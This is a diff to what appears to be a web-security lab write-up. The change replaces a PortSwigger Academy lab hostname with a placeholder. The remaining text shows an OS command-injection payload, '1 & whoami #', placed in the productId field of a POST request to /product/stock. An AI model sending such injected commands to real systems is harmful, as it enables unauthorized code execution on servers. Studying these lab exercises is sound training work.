@@ -4,7 +4,7 @@ In POST request, product ID parameter is vulnerable to RCE.<br>
 Payload: 1 & whoami #
 ```
 POST /product/stock HTTP/2
-Host: 0ac90059032173378055ea7e00580038.web-security-academy.net
+Host: HOST.com
 
 productId=1+%26+whoami+%23&storeId=1
 ```
